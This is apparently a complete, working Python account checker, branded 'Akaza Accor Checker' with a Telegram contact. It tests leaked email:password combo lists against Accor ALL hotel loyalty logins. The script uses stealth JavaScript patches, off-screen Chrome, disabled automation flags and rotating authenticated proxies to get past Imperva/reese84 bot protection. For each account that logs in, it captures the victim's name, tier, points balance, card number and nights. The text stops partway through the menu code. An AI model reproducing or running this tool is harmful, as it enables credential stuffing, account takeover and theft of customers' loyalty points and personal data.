#!/usr/bin/env python3
"""
Accor ALL (accor.com) Credential-Based Account Checker
Uses Playwright + real Chrome to bypass Imperva/reese84 anti-bot
Extracts: Name, Loyalty Tier, Points, Card#, Nights
"""

import asyncio
import argparse
import json
import os
import re
import sys
import tempfile
import shutil
from pathlib import Path

try:
    from playwright.async_api import async_playwright, TimeoutError as PwTimeout
except ImportError:
    print("[!] playwright not installed. Run: pip install playwright && python -m playwright install")
    sys.exit(1)


# ─── ANSI colors / branding ──────────────────────────────────────────────────
# Tiny color helper. We avoid third-party deps (no rich / colorama required)
# but try to enable ANSI on Windows terminals so the menu looks the same on
# every OS.
class C:
    RESET   = '\033[0m'
    BOLD    = '\033[1m'
    DIM     = '\033[2m'
    RED     = '\033[91m'
    GREEN   = '\033[92m'
    YELLOW  = '\033[93m'
    BLUE    = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN    = '\033[96m'
    WHITE   = '\033[97m'
    GREY    = '\033[90m'

# Best-effort enable ANSI on Windows (cmd / older PowerShell).
try:
    import colorama  # type: ignore
    colorama.just_fix_windows_console()
except Exception:
    if os.name == 'nt':
        # Setting any os.system call enables VT processing on win10+.
        os.system('')


# ─── Stealth / Speed helpers ─────────────────────────────────────────────────
# Strong stealth patch — masks the most common headless/automation tells
# so Imperva / reese84 still treats the browser as a regular Chrome user.
STEALTH_INIT_SCRIPT = r"""
// Hide webdriver
Object.defineProperty(navigator, 'webdriver', {get: () => undefined});

// Languages
Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});

// Plugins (length > 0 looks human)
Object.defineProperty(navigator, 'plugins', {
    get: () => [1, 2, 3, 4, 5].map(i => ({name: 'Plugin ' + i, filename: 'plugin' + i + '.dll'}))
});

// Hardware concurrency / memory (reasonable values)
try { Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 8}); } catch(e) {}
try { Object.defineProperty(navigator, 'deviceMemory', {get: () => 8}); } catch(e) {}

// chrome runtime stub
window.chrome = window.chrome || {};
window.chrome.runtime = window.chrome.runtime || {};
window.chrome.app = window.chrome.app || {isInstalled: false};

// Permissions API spoof (notifications)
const originalQuery = window.navigator.permissions && window.navigator.permissions.query;
if (originalQuery) {
    window.navigator.permissions.query = (parameters) => (
        parameters && parameters.name === 'notifications'
            ? Promise.resolve({state: Notification.permission})
            : originalQuery(parameters)
    );
}

// WebGL vendor / renderer (don't expose SwiftShader/Mesa)
try {
    const getParameter = WebGLRenderingContext.prototype.getParameter;
    WebGLRenderingContext.prototype.getParameter = function(p) {
        if (p === 37445) return 'Intel Inc.';
        if (p === 37446) return 'Intel Iris OpenGL Engine';
        return getParameter.call(this, p);
    };
} catch(e) {}
"""


# Resource types to block in headless/speed mode for big performance wins.
# We keep CSS + scripts + xhr/fetch (needed for the Accor login + API calls).
_BLOCKED_RESOURCE_TYPES = {'image', 'media', 'font'}


async def setup_page_speed(page, block_resources=True):
    """Apply stealth init script and (optionally) block heavy resources."""
    try:
        await page.add_init_script(STEALTH_INIT_SCRIPT)
    except Exception:
        pass

    if block_resources:
        async def _route_handler(route):
            try:
                if route.request.resource_type in _BLOCKED_RESOURCE_TYPES:
                    await route.abort()
                else:
                    await route.continue_()
            except Exception:
                try:
                    await route.continue_()
                except Exception:
                    pass

        try:
            await page.route('**/*', _route_handler)
        except Exception:
            pass


# ─── Proxy Extension Generator ───────────────────────────────────────────────
def create_proxy_extension(proxy_host, proxy_port, proxy_user, proxy_pass, ext_dir):
    """Create a Chrome MV2 extension for proxy authentication."""
    os.makedirs(ext_dir, exist_ok=True)

    manifest = {
        "version": "1.0.0",
        "manifest_version": 2,
        "name": "Proxy Auth",
        "permissions": ["proxy", "tabs", "unlimitedStorage", "storage",
                        "<all_urls>", "webRequest", "webRequestBlocking"],
        "background": {"scripts": ["background.js"]},
        "minimum_chrome_version": "22.0.0"
    }

    background_js = f"""
var config = {{
    mode: "fixed_servers",
    rules: {{
        singleProxy: {{
            scheme: "http",
            host: "{proxy_host}",
            port: parseInt({proxy_port})
        }},
        bypassList: ["localhost"]
    }}
}};
chrome.proxy.settings.set({{value: config, scope: "regular"}}, function(){{}});
function callbackFn(details) {{
    return {{
        authCredentials: {{
            username: "{proxy_user}",
            password: "{proxy_pass}"
        }}
    }};
}}
chrome.webRequest.onAuthRequired.addListener(
    callbackFn,
    {{urls: ["<all_urls>"]}},
    ['blocking']
);
"""

    with open(os.path.join(ext_dir, "manifest.json"), "w") as f:
        json.dump(manifest, f, indent=2)
    with open(os.path.join(ext_dir, "background.js"), "w") as f:
        f.write(background_js)

    return ext_dir


def parse_proxy(proxy_str):
    """
    Parse proxy string in 10+ common formats:
    1.  host:port
    2.  host:port:user:pass
    3.  user:pass@host:port
    4.  http://host:port
    5.  http://user:pass@host:port
    6.  https://user:pass@host:port
    7.  socks5://user:pass@host:port
    8.  socks4://user:pass@host:port
    9.  socks5://host:port
    10. host:port@user:pass (some tools)
    11. user:pass:host:port (reverse - detected by port validity)
    12. protocol://host:port:user:pass (mixed)
    """
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None

    protocol = 'http'

    # Strip protocol prefix
    for proto in ('socks5://', 'socks4://', 'https://', 'http://'):
        if proxy_str.lower().startswith(proto):
            protocol = proto.rstrip(':/')
            proxy_str = proxy_str[len(proto):]
            break

    host, port, user, passwd = None, None, None, None

    # Format: user:pass@host:port
    if '@' in proxy_str:
        left, right = proxy_str.rsplit('@', 1)
        right_parts = right.split(':')
        left_parts = left.split(':', 1)

        if len(right_parts) == 2 and right_parts[1].isdigit():
            # user:pass@host:port
            host, port = right_parts[0], right_parts[1]
            if len(left_parts) >= 2:
                user, passwd = left_parts[0], left_parts[1]
            else:
                user = left_parts[0]
        elif len(left_parts) == 2 and left_parts[1].isdigit():
            # host:port@user:pass (some tools use this)
            host, port = left_parts[0], left_parts[1]
            rp = right.split(':', 1)
            user = rp[0]
            passwd = rp[1] if len(rp) > 1 else None
        else:
            # Fallback: treat left as auth, right as host:port
            host = right_parts[0]
            port = right_parts[1] if len(right_parts) > 1 else '80'
            user, passwd = left_parts[0], left_parts[1] if len(left_parts) > 1 else None
    else:
        parts = proxy_str.split(':')
        if len(parts) == 2:
            # host:port
            host, port = parts[0], parts[1]
        elif len(parts) == 4:
            # Detect: host:port:user:pass vs user:pass:host:port
            if parts[1].isdigit():
                # host:port:user:pass
                host, port, user, passwd = parts[0], parts[1], parts[2], parts[3]
            elif parts[3].isdigit():
                # user:pass:host:port
                user, passwd, host, port = parts[0], parts[1], parts[2], parts[3]
            else:
                # Default: host:port:user:pass
                host, port, user, passwd = parts[0], parts[1], parts[2], parts[3]
        elif len(parts) == 3:
            # host:port:user (no pass)
            host, port, user = parts[0], parts[1], parts[2]
        else:
            return None

    if not host or not port:
        return None

    try:
        port = int(port)
    except (ValueError, TypeError):
        return None

    return {'host': host, 'port': port, 'user': user, 'pass': passwd, 'protocol': protocol}


# ─── Core Login Flow ──────────────────────────────────────────────────────────
async def do_login_flow(page, email, password, verbose=False):
    """
    Execute the Accor login flow on a given page.
    Assumes page is on all.accor.com (logged out state).
    Returns result dict.
    """
    result = {
        'email': email,
        'password': password,
        'status': 'DEAD',
        'name': None,
        'tier': None,
        'points': None,
        'card': None,
        'nights': None,
        'error': None
    }

    try:
        # Step 1: Get the OAuth authorization URL from the page and navigate to login
        if verbose:
            print(f"  [i] Looking for Sign in button...")

        if 'login.accor.com' not in page.url:
            # Strategy: Extract the OAuth URL from the page
            # The link is inside ace-block-enrollment which uses Shadow DOM
            auth_url = await page.evaluate('''() => {
                // The sign-in link is inside ace-block-enrollment's Shadow DOM
                const el = document.querySelector('ace-block-enrollment');
                if (el && el.shadowRoot) {
                    const link = el.shadowRoot.querySelector('a[href*="authentication"]');
                    if (link) return link.href;
                }
                // Fallback: check regular DOM
                const links = document.querySelectorAll('a[href*="api.accor.com/authentication"]');
                for (const l of links) return l.href;
                return null;
            }''')

            if auth_url:
                if verbose:
                    print(f"  [i] Found OAuth URL, navigating directly...")
                await page.goto(auth_url, wait_until='domcontentloaded', timeout=30000)
                # Give the login page time to fully render. Under Imperva
                # the email form often isn't in the DOM until a few seconds
                # after domcontentloaded, especially in headless / hidden
                # modes — so we wait for networkidle + a short grace.
                try:
                    await page.wait_for_load_state('networkidle', timeout=15000)
                except Exception:
                    pass
                await page.wait_for_timeout(1500)
            else:
                # Fallback: Click the Sign in button using JavaScript (bypass visibility)
                clicked = await page.evaluate('''() => {
                    // Try clicking the header button first
                    const headerBtn = document.querySelector('button[aria-expanded="false"]');
                    if (headerBtn && headerBtn.textContent.includes('Sign in')) {
                        headerBtn.click();
                        return 'header';
                    }
                    return null;
                }''')
                if clicked:
                    await page.wait_for_timeout(1500)
                    # Now click the "Sign in" button in dropdown via JS
                    await page.evaluate('''() => {
                        const btns = document.querySelectorAll('button');
                        for (const b of btns) {
                            const txt = b.textContent.trim();
                            if (txt === 'Sign in') { b.click(); return true; }
                        }
                        // Try links too
                        const links = document.querySelectorAll('a');
                        for (const l of links) {
                            if (l.textContent.trim() === 'Sign in') { l.click(); return true; }
                        }
                        return false;
                    }''')

                # Wait for navigation to login page
                try:
                    await page.wait_for_url('**/login.accor.com/**', timeout=20000)
                except PwTimeout:
                    pass

        # Verify we're on the login page
        if 'login.accor.com' not in page.url:
            result['error'] = f'Failed to reach login page (at: {page.url[:60]})'
            return result

        if verbose:
            print(f"  [i] On login page, entering email...")

        # Step 3: Wait for and fill email
        # We wait up to 30s here (was 10s) because Imperva's challenge can
        # delay the form rendering, especially in hidden/off-screen Chrome.
        # Also try a few selector variants since Accor occasionally tweaks
        # the markup.
        try:
            # Try waiting for the form to appear (any of the common variants)
            email_input = page.locator(
                'input[type="email"], '
                'input[name*="email" i], '
                'input[autocomplete="username"], '
                'input[type="text"]'
            ).first
            try:
                await email_input.wait_for(state='visible', timeout=30000)
            except PwTimeout:
                # One more shot: maybe the page is still loading from an
                # Imperva challenge — give it a final settle and retry.
                try:
                    await page.wait_for_load_state('networkidle', timeout=10000)
                except Exception:
                    pass
                await page.wait_for_timeout(2000)
                await email_input.wait_for(state='visible', timeout=10000)
            await email_input.fill(email)
            await page.wait_for_timeout(300)
        except Exception as e:
            result['error'] = f'Email field error: {str(e)[:80]}'
            return result

        # Step 4: Submit email
        await page.locator('button[type="submit"]').first.click(timeout=5000)
        await page.wait_for_timeout(1500)

        # Step 5: Check what appeared
        page_html = await page.content()

        # Check if account doesn't exist (shows create account form)
        if 'Create your account' in page_html or 'create an account' in page_html.lower():
            result['error'] = 'Account not found (email not registered)'
            return result

        # Check if password field exists
        pw_count = await page.locator('input[type="password"]').count()
        if pw_count == 0:
            # Maybe still loading or different flow
            await page.wait_for_timeout(1500)
            pw_count = await page.locator('input[type="password"]').count()

        if pw_count == 0:
            result['error'] = 'No password field (account may not exist)'
            return result

        if verbose:
            print(f"  [i] Entering password...")

        # Step 6: Fill password
        await page.locator('input[type="password"]').first.fill(password)
        await page.wait_for_timeout(300)

        # Step 7: Submit password
        await page.locator('button[type="submit"]').first.click(timeout=5000)

        if verbose:
            print(f"  [i] Submitted, waiting for result...")

        # Step 8: Wait for redirect away from login.accor.com
        # OAuth flow redirects through multiple URLs back to all.accor.com
        # Wait up to 25s for the URL to leave login.accor.com
        redirected = False
        for _ in range(25):
            await page.wait_for_timeout(1000)
            try:
                current_url = page.url
                if 'login.accor.com' not in current_url:
                    redirected = True
                    break
            except Exception:
                pass

        if not redirected:
            # Still on login.accor.com after 25s - check for error messages
            current_url = page.url
            try:
                page_html = await page.content()
            except Exception:
                page_html = ''
            page_text = page_html.lower()
        else:
            # Successfully redirected away - wait for final page to load
            try:
                await page.wait_for_load_state('domcontentloaded', timeout=15000)
            except Exception:
                pass
            await page.wait_for_timeout(1500)
            current_url = page.url
            try:
                page_html = await page.content()
            except Exception:
                page_html = ''
            page_text = page_html.lower()

        # Check for error messages
        if 'login.accor.com' in current_url:
            if any(x in page_text for x in ['incorrect', 'invalid', 'wrong password', 'mot de passe incorrect']):
                result['error'] = 'Invalid password'
                return result
            elif any(x in page_text for x in ['locked', 'blocked', 'too many attempts', 'verrouillé']):
                result['error'] = 'Account locked / rate limited'
                return result
            elif any(x in page_text for x in ['try again', 'error']):
                result['error'] = 'Login error (check credentials)'
                return result
            else:
                # Still on login page but no clear error - might be loading
                await page.wait_for_timeout(5000)
                if 'login.accor.com' in page.url:
                    result['error'] = 'Login failed (still on login page)'
                    return result

        # If we got redirected away from login.accor.com → SUCCESS
        result['status'] = 'ALIVE'

        if verbose:
            print(f"  [+] LOGIN SUCCESS! Extracting account data...")

        # Step 9: Extract data via API interception
        # Navigate to loyalty page and intercept the customer API response
        await page.bring_to_front()

        api_responses = []

        async def handle_response(response):
            nonlocal api_responses
            url = response.url
            if 'api.accor.com/customer/' in url and response.status == 200:
                try:
                    data = await response.json()
                    api_responses.append(data)
                except Exception:
                    pass

        page.on('response', handle_response)

        try:
            await page.goto('https://all.accor.com/account/en/my-loyalty-program', wait_until='networkidle', timeout=30000)
            await page.wait_for_timeout(2500)
        except Exception:
            pass

        page.remove_listener('response', handle_response)

        # Merge all API responses (pick the one with the most loyalty data)
        api_data = {}
        for resp in api_responses:
            if isinstance(resp, dict):
                # Merge: prefer responses with more loyalty sub-keys
                if 'loyalty' in resp:
                    existing_loyalty = api_data.get('loyalty', {})
                    new_loyalty = resp.get('loyalty', {})
                    if isinstance(new_loyalty, dict) and len(new_loyalty) > len(existing_loyalty if isinstance(existing_loyalty, dict) else {}):
                        api_data = resp
                    elif not api_data:
                        api_data = resp
                elif not api_data:
                    api_data = resp

        if verbose:
            print(f"  [i] API responses captured: {len(api_responses)}, using response with loyalty data: {bool(api_data and 'loyalty' in api_data)}")

        # Extract from API response
        if api_data:
            # Name
            try:
                ind_name = api_data.get('individual', {}).get('individualName', {})
                first = ind_name.get('firstName', '')
                last = ind_name.get('lastName', '')
                if first or last:
                    result['name'] = f"{first} {last}".strip()
            except Exception:
                pass

            # Card number from loyaltyCards
            try:
                cards = api_data.get('loyalty', {}).get('loyaltyCards', {}).get('card', [])
                if isinstance(cards, list) and cards:
                    result['card'] = str(cards[0].get('cardNumber', ''))
                elif isinstance(cards, dict):
                    result['card'] = str(cards.get('cardNumber', ''))
            except Exception:
                pass

            # Points (nbPoints = reward points)
            try:
                balances = api_data.get('loyalty', {}).get('balances', {})
                nb_pts = balances.get('nbPoints')
                if nb_pts is not None:
                    result['points'] = str(nb_pts)
            except Exception:
                pass

            # Nights
            try:
                balances = api_data.get('loyalty', {}).get('balances', {})
                nights = balances.get('currentNightsBalance')
                if nights is not None:
                    result['nights'] = str(nights)
            except Exception:
                pass

            # Tier/Status - derive from cardCodeTARS or nextTiering
            try:
                # Map cardCodeTARS to tier name
                TIER_MAP = {'A1': 'Classic', 'A2': 'Silver', 'A3': 'Gold', 'A4': 'Platinum', 'A5': 'Diamond', 'A6': 'Limitless'}
                NEXT_TO_CURRENT = {'Silver': 'Classic', 'Gold': 'Silver', 'Platinum': 'Gold', 'Diamond': 'Platinum', 'Limitless': 'Diamond'}

                cards = api_data.get('loyalty', {}).get('loyaltyCards', {}).get('card', [])
                if isinstance(cards, list) and cards:
                    code = cards[0].get('cardProduct', {}).get('cardCodeTARS', '')
                    if code in TIER_MAP:
                        result['tier'] = TIER_MAP[code]

                # Fallback: derive from nextTiering
                if not result['tier']:
                    member_info = api_data.get('loyalty', {}).get('memberInfo', {})
                    next_tier = member_info.get('nextTiering')
                    if next_tier and next_tier in NEXT_TO_CURRENT:
                        result['tier'] = NEXT_TO_CURRENT[next_tier]
                    elif member_info.get('currentTierCode') or member_info.get('currentTier'):
                        tier = member_info.get('currentTierCode') or member_info.get('currentTier')
                        result['tier'] = tier.strip().title()
            except Exception:
                pass

        # Fallback: extract from page DOM if API didn't work
        if not result['name'] or not result['points']:
            try:
                page_text = await page.text_content('body') or ''
                # Name from header
                name_el = page.locator('button[aria-label*="account" i], button[aria-label*="Account"]')
                if not result['name'] and await name_el.count() > 0:
                    name_text = await name_el.first.text_content()
                    if name_text:
                        result['name'] = name_text.strip()
                # Points from sidebar
                if not result['points']:
                    m = re.search(r'([\d,]+)\s*Reward points', page_text)
                    if m:
                        result['points'] = m.group(1).replace(',', '')
                # Nights from sidebar
                if not result['nights']:
                    m = re.search(r'([\d,]+)\s*Status Points and\s*(\d+)\s*nights', page_text)
                    if m:
                        result['nights'] = m.group(2)
                # Tier
                if not result['tier']:
                    m = re.search(r'Status\s*(Classic|Silver|Gold|Platinum|Diamond|Limitless)', page_text, re.IGNORECASE)
                    if m:
                        result['tier'] = m.group(1).title()
            except Exception:
                pass

        # Card fallback from cookies
        if not result['card']:
            context = page.context
            cookies = await context.cookies()
            for cookie in cookies:
                if cookie['name'] == 'OCC_all.accor' and '|' in cookie['value']:
                    result['card'] = cookie['value'].split('|')[1]

    except Exception as e:
        result['error'] = str(e)[:120]

    return result


# ─── CDP Mode ────────────────────────────────────────────────────────────────
async def check_account_cdp(email, password, cdp_url='http://localhost:29229', verbose=False, block_resources=True):
    """Check account using CDP connection to running Chrome."""
    result = {
        'email': email, 'password': password, 'status': 'DEAD',
        'name': None, 'tier': None, 'points': None, 'card': None, 'nights': None, 'error': None
    }

    try:
        async with async_playwright() as p:
            browser = await p.chromium.connect_over_cdp(cdp_url)
            context = browser.contexts[0]

            # Clear login-related cookies to force fresh login
            all_cookies = await context.cookies()
            login_cookies = [c for c in all_cookies if 'accor' in c.get('domain', '')]
            if login_cookies:
                await context.clear_cookies()

            page = await context.new_page()
            await setup_page_speed(page, block_resources=block_resources)

            if verbose:
                print(f"  [i] CDP: Navigating to all.accor.com...")

            # Navigate to homepage (should show as logged out after cookie clear)
            await page.goto('https://all.accor.com/a/en.html', wait_until='domcontentloaded', timeout=30000)
            await page.wait_for_timeout(3000)

            # Run the login flow
            result = await do_login_flow(page, email, password, verbose)

            await page.close()

    except Exception as e:
        result['error'] = str(e)[:120]

    return result


# ─── Standalone Mode (launches own Chrome) ────────────────────────────────────
async def check_account_standalone(email, password, proxy=None, verbose=False, browser_path=None, headless=True, block_resources=True):
    """Check account by launching a fresh Chrome instance.

    headless=True (default): launches a real, fully-rendered Chrome whose
    window is parked off-screen at (-32000, -32000). The user never sees
    it and it doesn't steal focus, but the browser is still indistinguishable
    from a human-driven Chrome (so it passes Imperva / reese84).
    headless=False: visible on-screen Chrome window — only useful for
    debugging the login flow.
    block_resources=True: skip images/fonts/media to make page loads ~2-3x
    faster (CSS/JS/XHR are still allowed since the login form needs them).
    """
    result = {
        'email': email, 'password': password, 'status': 'DEAD',
        'name': None, 'tier': None, 'points': None, 'card': None, 'nights': None, 'error': None
    }

    ext_dir = None
    user_data_dir = None

    try:
        async with async_playwright() as p:
            launch_args = [
                '--no-first-run',
                '--no-default-browser-check',
                '--disable-blink-features=AutomationControlled',
                '--disable-features=IsolateOrigins,site-per-process,TranslateUI,BlinkGenPropertyTrees',
                '--disable-infobars',
                # ── Speed / resource flags ───────────────────────────────────
                '--disable-gpu',
                '--disable-dev-shm-usage',
                '--disable-background-timer-throttling',
                '--disable-backgrounding-occluded-windows',
                '--disable-renderer-backgrounding',
                '--disable-ipc-flooding-protection',
                '--disable-popup-blocking',
                '--disable-notifications',
                '--disable-translate',
                '--disable-sync',
                '--disable-default-apps',
                '--disable-component-update',
                '--disable-domain-reliability',
                '--disable-client-side-phishing-detection',
                '--metrics-recording-only',
                '--no-pings',
                '--mute-audio',
                '--no-sandbox',
            ]

            if headless:
                # "Hidden" mode = real, fully-rendered Chrome whose window is
                # parked off-screen at (-32000, -32000). The browser is still
                # a 100% real headed Chrome — same JS environment, same WebGL,
                # same fingerprint — so Imperva / reese84 treats it as a human.
                # The user just never sees the window and it doesn't steal
                # focus, so they can keep working on their PC.
                #
                # Why not --headless=new ?  In testing, Accor's anti-bot still
                # flags the new headless engine and rejects logins outright,
                # so it's a no-go for this site even though it's "modern".
                launch_args.append('--window-position=-32000,-32000')
                launch_args.append('--window-size=1280,800')
                launch_args.append('--start-minimized')
            else:
                # Visible debugging mode — normal on-screen Chrome window.
                launch_args.append('--window-size=1280,800')

            if proxy:
                if proxy.get('user'):
                    ext_dir = tempfile.mkdtemp(prefix='proxy_ext_')
                    create_proxy_extension(proxy['host'], proxy['port'], proxy['user'], proxy['pass'], ext_dir)
                    launch_args.extend([
                        f'--load-extension={ext_dir}',
                        f'--disable-extensions-except={ext_dir}',
                    ])
                else:
                    launch_args.append(f'--proxy-server={proxy["host"]}:{proxy["port"]}')

            user_data_dir = tempfile.mkdtemp(prefix='accor_chrome_')

            # Find Chrome
            chrome_path = browser_path
            if not chrome_path:
                for path in [
                    shutil.which('google-chrome-stable'),
                    shutil.which('google-chrome'),
                    '/usr/bin/google-chrome-stable',
                    '/usr/bin/google-chrome',
                    '/home/ubuntu/.local/bin/google-chrome',
                    '/opt/google/chrome/google-chrome',
                    'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
                    'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
                ]:
                    if path and os.path.exists(path):
                        chrome_path = path
                        break

            if verbose:
                mode = 'hidden (off-screen)' if headless else 'visible'
                print(f"  [i] Chrome: {chrome_path or 'Playwright Chromium fallback'} [{mode}]")

            context = await p.chromium.launch_persistent_context(
                user_data_dir,
                executable_path=chrome_path,
                # Always pass headless=False to Playwright — we control headless
                # ourselves via --headless=new so we get the new mode + extension
                # support + better stealth.
                headless=False,
                args=launch_args,
                ignore_default_args=['--enable-automation'],
                viewport={'width': 1280, 'height': 800},
            )

            page = context.pages[0] if context.pages else await context.new_page()
            await setup_page_speed(page, block_resources=block_resources)

            if verbose:
                print(f"  [i] Navigating to all.accor.com...")

            await page.goto('https://all.accor.com/a/en.html', wait_until='domcontentloaded', timeout=30000)
            await page.wait_for_timeout(2000)

            result = await do_login_flow(page, email, password, verbose)

            await context.close()

    except Exception as e:
        result['error'] = str(e)[:120]
    finally:
        if ext_dir and os.path.exists(ext_dir):
            shutil.rmtree(ext_dir, ignore_errors=True)
        if user_data_dir and os.path.exists(user_data_dir):
            shutil.rmtree(user_data_dir, ignore_errors=True)

    return result


# ─── Output Formatting ────────────────────────────────────────────────────────
def format_result(result):
    """Format checker result for console."""
    cred = f"{result['email']}:{result['password']}"
    if result['status'] == 'ALIVE':
        parts = [f"\033[92m[ALIVE]\033[0m {cred}"]
        if result['name']:
            parts.append(f"Name: {result['name']}")
        if result['tier']:
            parts.append(f"Tier: {result['tier']}")
        if result['points']:
            parts.append(f"Points: {result['points']}")
        if result['card']:
            parts.append(f"Card#: {result['card']}")
        if result['nights']:
            parts.append(f"Nights: {result['nights']}")
        return ' | '.join(parts)
    else:
        return f"\033[91m[DEAD]\033[0m {cred} | {result.get('error', 'Unknown')}"


def format_result_plain(result):
    """Format without ANSI colors (for file output)."""
    cred = f"{result['email']}:{result['password']}"
    if result['status'] == 'ALIVE':
        parts = [f"[ALIVE] {cred}"]
        if result['name']:
            parts.append(f"Name: {result['name']}")
        if result['tier']:
            parts.append(f"Tier: {result['tier']}")
        if result['points']:
            parts.append(f"Points: {result['points']}")
        if result['card']:
            parts.append(f"Card#: {result['card']}")
        if result['nights']:
            parts.append(f"Nights: {result['nights']}")
        return ' | '.join(parts)
    else:
        return f"[DEAD] {cred} | {result.get('error', 'Unknown')}"


# ─── Banner ───────────────────────────────────────────────────────────────────
# Akaza-style banner. Matches the look of `akaza_accor.py` in this repo so
# every script in the toolkit feels cohesive.
_AKAZA_LOGO = r"""
  ▄▄▄       ██ ▄█▀▄▄▄      ▒███████▒ ▄▄▄
 ▒████▄     ██▄█▒▒████▄    ▒ ▒ ▒ ▄▀░▒████▄
 ▒██  ▀█▄  ▓███▄░▒██  ▀█▄  ░ ▒ ▄▀▒░ ▒██  ▀█▄
 ░██▄▄▄▄██ ▓██ █▄░██▄▄▄▄██   ▄▀▒   ░░██▄▄▄▄██
  ▓█   ▓██▒▒██▒ █▄▓█   ▓██▒▒███████▒ ▓█   ▓██▒
  ▒▒   ▓▒█░▒ ▒▒ ▓▒▒▒   ▓▒█░░░▒ ▓░▒░▒ ▒▒   ▓▒█░
   ▒   ▒▒ ░░ ░▒ ▒░ ▒   ▒▒ ░░ ░▒ ▒ ░  ▒   ▒▒ ░
   ░   ▒   ░ ░░ ░  ░   ▒   ░ ░ ░ ░ ░  ░   ▒
       ░  ░░  ░        ░  ░  ░ ░           ░  ░
"""

_ACCOR_LOGO = r"""
        ___   _____ _____ ____  ____
       /   | / ___// ___// __ \/ __ \
      / /| |/ /__ / /__ / / / / /_/ /
     / ___ / /___/ /___/ /_/ / _, _/
    /_/  |_\____/\____/\____/_/ |_|
"""


def show_banner():
    """Pretty Akaza + ACCOR banner shown at the top of every menu draw."""
    # Clear screen so the menu redraws cleanly between option changes.
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{C.CYAN}{C.BOLD}{_AKAZA_LOGO}{C.RESET}")
    print(f"{C.MAGENTA}{C.BOLD}{_ACCOR_LOGO}{C.RESET}")
    bar = '═' * 68
    print(f"{C.CYAN}{bar}{C.RESET}")
    print(f"   {C.WHITE}{C.BOLD}AKAZA  ACCOR  CHECKER{C.RESET}   "
          f"{C.GREY}|{C.RESET}  {C.YELLOW}v2.1{C.RESET}  "
          f"{C.GREY}|{C.RESET}  Telegram: {C.YELLOW}{C.BOLD}@akaza_isnt{C.RESET}")
    print(f"{C.CYAN}{bar}{C.RESET}\n")


# ─── Settings holder ─────────────────────────────────────────────────────────
class Settings:
    """Holds every option the menu can change.

    Each attribute corresponds to one row in the menu so the user can flip
    it on/off or set its value without ever touching the command line.
    """

    def __init__(self):
        # ── Inputs (require a value) ──────────────────────────────────────
        self.combo_source     = None   # path-to-file OR "email:pass"
        self.proxy_arg        = None   # path-to-file OR one proxy string
        self.cdp_arg          = None   # http://localhost:29229 etc.
        self.chrome_path      = None   # override Chrome binary

        # ── Toggles (on/off) ──────────────────────────────────────────────
        self.headless         = True   # invisible Chrome (default)
        self.block_resources  = True   # skip images/fonts/media for speed
        self.verbose          = False  # extra logs per step

    @staticmethod
    def fmt_value(v, default='not set'):
        """Render an input field — yellow if set, dim grey if unset."""
        if v is None or v == '':
            return f"{C.DIM}{default}{C.RESET}"
        s = str(v)
        if len(s) > 42:
            s = s[:39] + '...'
        return f"{C.YELLOW}{s}{C.RESET}"

    @staticmethod
    def fmt_toggle(on):
        """Render a toggle as green [ON] or red [OFF]."""
        if on:
            return f"{C.GREEN}{C.BOLD}[ ON  ]{C.RESET}"
        return f"{C.RED}{C.BOLD}[ OFF ]{C.RESET}"


def _print_menu(s):
    """Render the full settings menu. Every row has a one-line ↪ explainer
    underneath so the user knows exactly what each option controls."""
    show_banner()

    # ── INPUTS ─────────────────────────────────────────────────────────────
    print(f"  {C.BOLD}{C.WHITE}CONFIG{C.RESET}    {C.GREY}(set values){C.RESET}")
    print(f"  {C.GREY}{'─' * 30}{C.RESET}")

    print(f"   {C.CYAN}[1]{C.RESET} Combo source ........ {s.fmt_value(s.combo_source)}")
    print(f"        {C.GREY}↪ The email:pass list to check. Accepts a file path (one"
          f" combo per line){C.RESET}")
    print(f"        {C.GREY}  in 'email:pass' format) OR a single 'email:pass' string."
          f"{C.RESET}")

    print(f"   {C.CYAN}[2]{C.RESET} Proxy ............... {s.fmt_value(s.proxy_arg, 'none')}")
    print(f"        {C.GREY}↪ Optional. A file of proxies (rotated per-check) or one"
          f" proxy string.{C.RESET}")
    print(f"        {C.GREY}  Supports 12 formats: host:port, host:port:user:pass,"
          f"{C.RESET}")
    print(f"        {C.GREY}  user:pass@host:port, http://..., https://..., socks5://..., etc."
          f"{C.RESET}")

    print(f"   {C.CYAN}[3]{C.RESET} CDP url ............. {s.fmt_value(s.cdp_arg, 'none')}")
    print(f"        {C.GREY}↪ Optional. Connect to an already-running Chrome via its"
          f"{C.RESET}")
    print(f"        {C.GREY}  --remote-debugging-port instead of launching a new one."
          f"{C.RESET}")
    print(f"        {C.GREY}  Use this if Imperva starts blocking fresh browsers."
          f"{C.RESET}")

    print(f"   {C.CYAN}[4]{C.RESET} Chrome path ......... {s.fmt_value(s.chrome_path, 'auto-detect')}")
    print(f"        {C.GREY}↪ Optional. Override the path to chrome.exe / google-chrome."
          f"{C.RESET}")
    print(f"        {C.GREY}  Leave blank to auto-detect from common install locations."
          f"{C.RESET}")

    # ── TOGGLES ────────────────────────────────────────────────────────────
    print()
    print(f"  {C.BOLD}{C.WHITE}TOGGLES{C.RESET}   {C.GREY}(flip on/off){C.RESET}")
    print(f"  {C.GREY}{'─' * 30}{C.RESET}")

    print(f"   {C.CYAN}[5]{C.RESET} Hidden Chrome ....... {s.fmt_toggle(s.headless)}")
    print(f"        {C.GREY}↪ ON  = Real Chrome runs off-screen at (-32000,-32000). You{C.RESET}")
    print(f"        {C.GREY}        never see the window and it can't steal focus, but{C.RESET}")
    print(f"        {C.GREY}        it's a fully-rendered Chrome so Imperva treats it as{C.RESET}")
    print(f"        {C.GREY}        human.  Default & recommended.{C.RESET}")
    print(f"        {C.GREY}  OFF = Visible on-screen Chrome window — useful for debugging.{C.RESET}")

    print(f"   {C.CYAN}[6]{C.RESET} Block heavy assets .. {s.fmt_toggle(s.block_resources)}")
    print(f"        {C.GREY}↪ ON  = Skip downloading images/fonts/media → ~2-3x faster."
          f"{C.RESET}")
    print(f"        {C.GREY}        CSS, JS, and XHR/API requests still load (login needs them)."
          f"{C.RESET}")
    print(f"        {C.GREY}  OFF = Load every resource like a regular browser would."
          f"{C.RESET}")

    print(f"   {C.CYAN}[7]{C.RESET} Verbose logs ........ {s.fmt_toggle(s.verbose)}")
    print(f"        {C.GREY}↪ ON  = Print step-by-step debug info per check (which selector"
